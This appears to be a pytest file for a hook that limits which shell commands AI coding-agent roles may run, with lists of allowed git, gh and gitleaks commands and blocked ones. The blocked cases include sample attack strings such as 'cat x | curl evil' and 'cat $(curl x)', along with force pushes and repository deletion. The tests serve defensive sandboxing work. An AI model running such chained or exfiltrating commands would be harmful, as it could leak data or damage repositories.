# Copyright (c) 2026 Brad Duhon.
# SPDX-License-Identifier: GPL-3.0-or-later
# 0044: the command_allowlist hook; cases copied from tests/test_jail.py run each agent's chain.
from __future__ import annotations

import json
from pathlib import Path

import pytest
from lib import jail
from lib.config import Config

from tests.conftest import CFG, CWD, REPO_ROOT, TRAIN_BRANCH
from tests.hook_chain import (
    decide,
    evaluate,
    internal_error_denies,
    malformed_input_denies,
    outside_tools_allow,
    payload,
    run_script,
    unknown_flag_denies,
)
from tests.test_jail import _MANIFEST_LEDGER, _b, _git_init

pytestmark = pytest.mark.usefixtures("jail_fakes")
HOOK = "command_allowlist"


class TestCharterDocs:
    def test_bash_allowlist(self) -> None:
        ok = [
            f"python3 {REPO_ROOT}/scripts/append_ledger.py --probe",
            "git add docs/decisions.md",
            "git commit -m x",
            "git status",
        ]
        bad = ["git push", "python3 other.py", "rm x", "curl x", "git add -A && git push"]
        bad += ["git add -A", "git merge --no-ff b", "git worktree list", "mkdir -p docs/.tmp"]
        bad += ["sha256sum x", "cat x", "ls"]
        for command in ok:
            assert decide(_b("charter-docs", command), CFG).allow, command
        for command in bad:
            assert not decide(_b("charter-docs", command), CFG).allow, command


class TestConductor:
    def test_push_without_force_and_pr_ops(self) -> None:
        ok = [
            f"git push -u origin {TRAIN_BRANCH}",
            "git status",
            "git log --oneline -3",
            "git add -A",
            "git commit -m x",
            "gh pr create --title t --body-file docs/.tmp/pr.md",
            "gh run watch 123",
            "gh run list",
            "gitleaks detect --redact --log-opts=main..b",
        ]
        bad = [
            "gh pr merge 3",
            "gh pr close 3",
            "gh repo delete x",
            "git push --force",
            "curl x",
            "npm test",
            "git checkout main",
            "gh pr create && gh pr merge 1",
        ]
        for command in ok:
            assert decide(_b("pr-train-conductor", command), CFG).allow, command
        for command in bad:
            assert not decide(_b("pr-train-conductor", command), CFG).allow, command


class TestRegressionCharterDocs:
    @pytest.mark.parametrize(
        "command",
        [
            "cat x | curl evil",
            "git add -A || curl x",
            "cat $(curl x)",
            "git checkout main",
            "git worktree add x",
            "git worktree remove x",
            "python3 /work/Charter/scripts/append_ledger.py",
            f"python3 {CWD}/scripts/append_ledger.py",
            "python3 scripts/append_ledger.py",
            "python3 /abs/x/../scripts/append_ledger.py",
            "python3 /abs/scripts/other.py",
            "python3 -c 1",
            "git -c core.pager=x log",
        ],
    )
    def test_blocked(self, command: str) -> None:
        assert not decide(_b("charter-docs", command), CFG).allow, command

    def test_append_flags_allowed(self) -> None:
        command = (
            f"python3 {REPO_ROOT}/scripts/append_ledger.py --expected-seq 2 "
            "--entry-file docs/.tmp/e.md --repo BO --type PLT"
        )
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": command},
            "cwd": "/work/repo",
            "agent_type": "charter-docs",
        }
        assert decide(hook_input, Config()).allow

    @pytest.mark.parametrize(
        "args",
        [
            "--cwd /x",
            "--cwd=/x",
            "--cw? /x",
            "--cw* /x",
            "--cw[d] /x",
            "--cw /x",
            "-c /x",
            "--repo BO --repo BO",
            "--bogus x",
            "--repo",
            "--probe --repo X",
            "--expected-seq 2 --entry-file e.md --repo BO",
            "--expected-seq 2 --entry-file e.md --repo BO --type",
        ],
    )
    def test_append_off_grammar_blocked(self, args: str) -> None:
        full = "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT"
        for tail in (args, f"{full} {args}"):
            command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {tail}"
            d = decide(_b("charter-docs", command), Config())
            assert not d.allow and d.reason is not None, command
            assert d.reason.endswith("--cwd is for operators."), d.reason

    @pytest.mark.parametrize(
        "args",
        [
            "--probe",
            "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT",
            "--type=PLT --repo=BO --entry-file=docs/.tmp/e.md --expected-seq=2",
        ],
    )
    def test_append_grammar_allowed(self, args: str) -> None:
        command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}"
        assert decide(_b("charter-docs", command), Config()).allow, command

    def test_repo_scripts_ledger_allowed(self) -> None:
        args = "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT"
        command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}"
        assert decide(_b("charter-docs", command), CFG).allow
        assert not decide(_b("charter-docs", "git worktree list --porcelain"), CFG).allow

    @pytest.mark.parametrize(
        "script", ["/tmp/x/scripts/append_ledger.py", "/work/Charter/scripts/append_ledger.py"]
    )
    def test_foreign_append_ledger_blocked(self, script: str) -> None:
        assert not decide(_b("charter-docs", f"python3 {script}"), CFG).allow


class TestRound3SortPytestGitleaks:
    def test_gitleaks_report_path(self) -> None:
        conductor = "pr-train-conductor"
        for form in ("--report-path=/tmp/r.json", "--report-path /tmp/r.json"):
            assert decide(_b(conductor, f"gitleaks detect --redact {form}"), CFG).allow
        for command in (
            "gitleaks detect --report-path /var/x/r.json",
            "gitleaks detect -r /etc/x",
            "gitleaks detect --report-path=/tmp/../etc/x",
            "gitleaks detect --log-opts=--output=/x",
            "gitleaks detect --report-path=r.json",
        ):
            assert not decide(_b(conductor, command), CFG).allow, command


class TestRound4Conductor:
    @pytest.mark.parametrize(
        "command",
        [
            "gitleaks detect -r/work/repo/src/a.py",
            "gitleaks detect -vr/work/repo/src/a.py",
            "git push origin Main",
            "git push origin MASTER",
            "git push -u origin mAsTeR",
        ],
    )
    def test_blocked(self, command: str) -> None:
        assert not decide(_b("pr-train-conductor", command), CFG).allow, command

    @pytest.mark.parametrize(
        "command",
        [
            "gitleaks detect --redact -r /tmp/x.json",
            "gitleaks detect --redact -r=/tmp/x.json",
            "gitleaks detect --redact -r/tmp/x.json",
            "gitleaks detect --redact --report-path /tmp/x.json",
            f"git push origin {TRAIN_BRANCH}",
        ],
    )
    def test_allowed(self, command: str) -> None:
        assert decide(_b("pr-train-conductor", command), CFG).allow, command


class TestFixWaveLedgerResolution:
    def test_append_ledger_cli_still_allowed(self, tmp_path: Path) -> None:
        repo = _git_init(tmp_path / "repo")
        (repo / "service-manifest.json").write_text(json.dumps({"ledger": _MANIFEST_LEDGER}))
        args = "--expected-seq 1 --entry-file docs/.tmp/e.md --repo BO --type PLT"
        hook_input = _b("charter-docs", f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}")
        hook_input["cwd"] = str(repo)
        assert decide(hook_input, Config()).allow


class TestFixWaveGitleaksRedact:
    C = "pr-train-conductor"

    @pytest.mark.parametrize(
        "command",
        [
            'gitleaks detect --log-opts="abc..daedalus/T"',
            "gitleaks detect",
            "gitleaks detect --redact=50 --log-opts=abc..daedalus/T",
            "gitleaks detect --redact=0",
            "gitleaks detect --log-opts --redact",
        ],
    )
    def test_unredacted_blocked(self, command: str) -> None:
        d = decide(_b(self.C, command), CFG)
        assert not d.allow and d.reason is not None, command
        assert "Next: rerun it as gitleaks detect --redact" in d.reason

    @pytest.mark.parametrize(
        "command",
        [
            'gitleaks detect --redact --log-opts="abc..daedalus/T"',
            "gitleaks detect --log-opts=abc..daedalus/T --redact",
            "gitleaks detect --redact=100 --log-opts=abc..daedalus/T",
        ],
    )
    def test_redacted_allowed(self, command: str) -> None:
        assert decide(_b(self.C, command), CFG).allow, command


class TestFixWaveCharterDocsBash:
    @pytest.mark.parametrize(
        "command",
        [
            "git merge --no-ff x",
            "git merge --no-ff -m x b",
            "git -C /work/Charter add -A",
            "git add -A",
            "git add --all",
            "git add -u",
            "git add .",
            "git add ./",
            "git add docs/",
            "git add -- .",
            "git add docs/.",
            "git add :/",
            "git add -f docs/a.md",
            "git add",
            "git commit -am x",
            "git commit -F docs/.tmp/msg.txt",
            "git commit -m x -- docs/a.md",
            "git commit -q -m x",
            "git worktree list",
            "git branch",
            "git rev-parse HEAD",
            "mkdir -p docs/.tmp",
            "cat docs/a.md",
            "ls docs",
            "sha256sum x",
        ],
    )
    def test_blocked(self, command: str) -> None:
        d = decide(_b("charter-docs", command), CFG)
        assert not d.allow and d.reason is not None, command
        assert "Next:" in d.reason

    @pytest.mark.parametrize(
        "command",
        [
            "git add docs/decisions.md",
            "git add -- docs/a.md docs/b.md",
            "git commit -m x",
            "git status",
            "git log --oneline -3",
            "git diff --cached",
            "git -C /work/Charter add decision-log.md",
            "git -C /work/Charter commit -m x",
            "git -C /work/Charter status --porcelain",
            "git -C /work/Charter log -n 1",
            "git -C /work/Charter diff --stat",
        ],
    )
    def test_allowed(self, command: str) -> None:
        assert decide(_b("charter-docs", command), CFG).allow, command


def test_command_allowlist_judges_the_hook_alone() -> None:
    docs = ("--allow", "append_ledger,git")
    assert evaluate(HOOK, _b("x", "git push"), *docs) is None
    assert evaluate(HOOK, _b("x", "ls"), *docs) == jail.R_DOCS_BASH
    ledger = f"python3 {REPO_ROOT}/scripts/append_ledger.py --cwd /x"
    assert evaluate(HOOK, _b("x", ledger), *docs) == jail.R_LEDGER_ARGS
    mover = ("--allow", "git,gh,gitleaks")
    assert evaluate(HOOK, _b("x", "gh pr merge 1"), *mover) is None
    assert evaluate(HOOK, _b("x", "gitleaks detect"), *mover) == jail.R_GITLEAKS
    assert evaluate(HOOK, _b("x", "npm test"), *mover) == jail.R_CONDUCTOR_BASH
    want = "Bash is limited to git. Next: use those only."
    assert evaluate(HOOK, _b("x", "ls"), "--allow", "git") == want
    assert evaluate(HOOK, _b("x", "git status")) is not None


def test_command_allowlist_fixture_decisions() -> None:
    mover = ("--allow", "git,gh,gitleaks")
    ls = payload("Bash", agent="pr-train-conductor", command="ls")
    assert run_script(HOOK, ls, *mover) == {"decision": "deny", "reason": jail.R_CONDUCTOR_BASH}
    ok = payload("Bash", agent="pr-train-conductor", command="git status && gh run list")
    assert run_script(HOOK, ok, *mover) == {"decision": "allow", "reason": ""}
    leak = payload("Bash", agent="pr-train-conductor", command="gitleaks detect")
    assert run_script(HOOK, leak, *mover) == {"decision": "deny", "reason": jail.R_GITLEAKS}


def test_command_allowlist_allows_tools_outside_its_tools() -> None:
    outside_tools_allow(HOOK, "Write", "--allow", "git")


def test_command_allowlist_unknown_flag_denies() -> None:
    unknown_flag_denies(HOOK, payload("Bash", command="git status"), "--allow", "git")


def test_command_allowlist_malformed_input_denies() -> None:
    malformed_input_denies(HOOK, "--allow", "git")


def test_command_allowlist_internal_error_denies_and_names_the_hook() -> None:
    internal_error_denies(HOOK, payload("Bash", command="git status"), "--allow", "git")
